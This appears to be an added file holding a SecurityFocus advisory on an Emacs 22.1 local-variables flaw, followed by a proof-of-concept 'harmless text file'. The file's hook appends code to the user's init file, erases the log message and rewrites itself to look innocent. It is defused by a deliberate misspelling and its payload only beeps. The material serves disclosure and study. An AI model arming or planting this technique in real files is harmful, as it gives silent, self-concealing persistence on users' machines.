@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/26327/info
+
+Emacs is prone to a vulnerability that lets attackers execute arbitrary code.
+
+Due to a design error, the application ignores certain security settings and modifies local variables.
+
+By supplying a malicious file, an attacker can exploit this issue to carry out various attacks, including executing arbitrary code in the context of the application. This may facilitate remote unauthorized access.
+
+This issue affects Emacs 22.1; other versions may be vulnerable as well. 
+
+This is a harmless text file.  Or at least it looks like one.  In
+fact, it is.  But it's almost not.  If you were to change the word
+"variaboles" below to "variables", then load it into a vulnerable
+Emacs 22 with `enable-local-variables' set to :safe, it would rewrite
+the local variables list in the buffer itself to _look_ like a
+harmless text file, while in fact managing to add some evil code to
+the end of your user-init-file.  Woopsy.
+
+| Local variaboles:
+| hack-local-variables-hook: ((lambda () (save-excursion (with-temp-buffer (insert "\n(run-with-timer 1 nil (lambda () (beep) (message \"Your Emacs init file is compromised!\")))") (append-to-file (point-min) (point-max) user-init-file)) (message nil) (with-current-buffer (get-buffer "*Messages*") (when (search-backward (concat "Added to " user-init-file) nil t) (let ((start (point-at-bol))) (forward-line +1) (delete-region start (point))))) (goto-char (point-max)) (search-backward "| hack-local-variables-hook") (let ((start (point-at-bol))) (forward-line +1) (delete-region start (point))) (insert "| mode: text\n") (set-buffer-modified-p nil) (text-mode))))
+| End:
